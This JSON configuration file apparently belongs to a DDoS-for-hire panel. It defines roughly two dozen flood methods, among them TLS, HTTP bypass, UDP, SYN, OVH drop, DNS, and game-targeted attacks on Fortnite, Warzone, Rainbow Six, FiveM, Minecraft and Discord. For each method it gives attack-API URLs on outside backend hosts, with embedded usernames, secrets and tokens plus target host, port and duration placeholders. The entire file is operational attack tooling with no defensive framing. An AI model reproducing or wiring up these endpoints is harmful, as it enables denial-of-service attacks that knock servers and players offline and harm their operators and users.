[
    {
        "name": "rudy-httpszoom",
        "time": 180,
        "description": "HTTPS Zoom attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=httpszoom_api"
            
        ]
    },
    {
        "name": "rudy-browser",
        "time": 200,
        "description": "Browser-based attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=browser_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BROWSER"
        ]
    },
    {
        "name": "rudy-tls",
        "time": 180,
        "description": "TLS attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tls_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS"
        ]
    },
    {
        "name": "rudy-http",
        "time": 180,
        "description": "HTTP attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=http_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=RAW-V1"
        ]
    },
    {
        "name": "rudy-https",
        "time": 180,
        "description": "HTTPS attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=https_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BYPASS"
        ]
    },
    {
        "name": "rudy-tcpbypass",
        "time": 180,
        "description": "TCP Bypass attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcpbypass_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP-BYPASS"
        ]
    },
    {
        "name": "rudy-udpbypass",
        "time": 180,
        "description": "UDP Bypass attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udpbypass_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP-KILL"
        ]
    },
    {
        "name": "rudy-synboom",
        "time": 180,
        "description": "SYN Boom attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=synboom_api"
        ]
    },
    {
        "name": "rudy-udp-raw",
        "time": 180,
        "description": "UDP Raw attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-raw"
        ]
    },
    {
        "name": "rudy-homeslam",
        "time": 180,
        "description": "Home Slam attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=homeslam_api"
        ]
    },
    {
        "name": "rudy-ovhdrop",
        "time": 180,
        "description": "OVH Drop attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ovhdrop_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP-OVH"
        ]
    },
    {
        "name": "rudy-socket",
        "time": 180,
        "description": "Socket attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=socket_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=SOCKET"
        ]
    },
    {
        "name": "rudy-dns",
        "time": 180,
        "description": "DNS attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=dns_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HANDSHAKE"
        ]
    },
    {
        "name": "rudy-ssh",
        "time": 180,
        "description": "SSH attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=ssh"
        ]
    },
    {
        "name": "rudy-game",
        "time": 180,
        "description": "Game attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=game_api"
        ]
    },
    {
        "name": "rudy-fortnite",
        "time": 180,
        "description": "Fortnite attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=fortnite_api"
        ]
    },
    {
        "name": "rudy-wz-lag",
        "time": 180,
        "description": "Warzone Lag attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=wz-lag_api"
        ]
    },
    {
        "name": "rudy-r6-drop",
        "time": 180,
        "description": "Rainbow Six Drop attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=r6-drop_api"
        ]
    },
    {
        "name": "rudy-wz-crash",
        "time": 180,
        "description": "Warzone Crash attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=wz-crash_api"
        ]
    },
    {
        "name": "rudy-fivem-xv",
        "time": 180,
        "description": "FiveM XV attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=fivem-xv_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=FIVEM"
        ]
    },
    {
        "name": "rudy-tcpout",
        "time": 180,
        "description": "TCP Out attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcpout_api"
        ]
    },
    {
        "name": "rudy-discord",
        "time": 180,
        "description": "Discord attack method",
        "api": [
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=DISCORD"
        ]
    },
    {
        "name": "rudy-minecraft",
        "time": 180,
        "description": "Minecraft attack method",
        "api": [
            "https://elitenetwork.su/api/attack?username=pc10211&secret=Fortnite100?&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=minecraft_api",
            "http://62.146.236.59:5000/?token=bytedown0044&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=buee"
        ]
    }
]
